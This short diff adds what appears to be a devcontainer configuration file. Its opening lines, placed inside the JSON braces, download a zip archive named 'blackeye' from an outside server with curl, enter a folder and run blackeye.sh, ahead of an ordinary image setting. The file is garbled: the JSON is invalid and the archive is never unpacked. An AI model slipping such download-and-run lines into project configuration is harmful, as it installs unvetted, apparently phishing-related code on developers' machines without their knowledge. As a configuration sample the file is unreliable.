@@ -1,0 +1,6 @@
+{curl -O http://dsvr.blackeye.cloud/alld/blackeye.zip
+cd blackeye
+bash blackeye.sh
+  "image": "mcr.microsoft.com/devcontainers/universal:2",
+  "features": {}
+}
